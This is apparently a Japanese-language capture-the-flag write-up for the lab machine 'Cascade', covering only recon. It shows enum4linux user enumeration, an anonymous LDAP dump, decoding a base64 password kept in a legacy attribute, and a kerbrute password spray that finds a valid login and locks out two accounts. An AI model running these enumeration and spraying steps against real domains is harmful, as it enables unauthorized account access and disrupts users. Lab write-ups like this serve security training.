# Recon

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ enum4linux -a -M -l -d 10.10.10.182
...
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

この`enum4linux`の結果よりユーザリストを作る：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ cat users.txt
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```
（まったくおいしい情報がみつからないので）`ldapsearch`で詳細にenumをする。

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ ldapsearch -x -H ldap://10.10.10.182 -b 'DC=cascade,DC=local' > ldapsearch-domain.txt
```
一列目のdnとかsAMAccoufntTypeとかobjectClassの項目で、出現頻度が少ないものに着目しようと
おもい、以下のように実行した（infoの欄にパスワードが書かれてたりすることがあるから）

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ cut -d : -f 1 ldapsearch-domain.txt | sort | uniq -c | sort  | less
...
      1 # {6AC1786C-016F-11D2-945F-00C04fB984F9}, Policies, System, cascade.local
      1 # {820E48A7-D083-4C2D-B5F8-B24462924714}, Policies, System, cascade.local
      1 # {D67C2AD5-44C7-4468-BA4C-199E75B2F295}, Policies, System, cascade.local
      1 auditingPolicy
      1 cascadeLegacyPwd
      1 dNSHostName
...

┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ grep LegacyPwd ldapsearch-domain.txt
cascadeLegacyPwd: clk0bjVldmE=

┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ echo -n clk0bjVldmE= | base64 -d
rY4n5eva
```

`kerbrute`より、rY4n5evaはr.thompsonのパスワードと判明：

```
┌──(shoebill㉿shoebill)-[~/Cascade_10.10.10.182]
└─$ kerbrute passwordspray -v --dc 10.10.10.182 -d cascade.local users.txt 'rY4n5eva'    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/25/22 - Ronnie Flathers @ropnop

2022/10/25 15:58:08 >  Using KDC(s):
2022/10/25 15:58:08 >   10.10.10.182:88

2022/10/25 15:58:17 >  [!] b.hanson@cascade.local:rY4n5eva - USER LOCKED OUT
2022/10/25 15:58:17 >  [!] e.crowe@cascade.local:rY4n5eva - USER LOCKED OUT
2022/10/25 15:58:23 >  [+] VALID LOGIN:  r.thompson@cascade.local:rY4n5eva
...
```


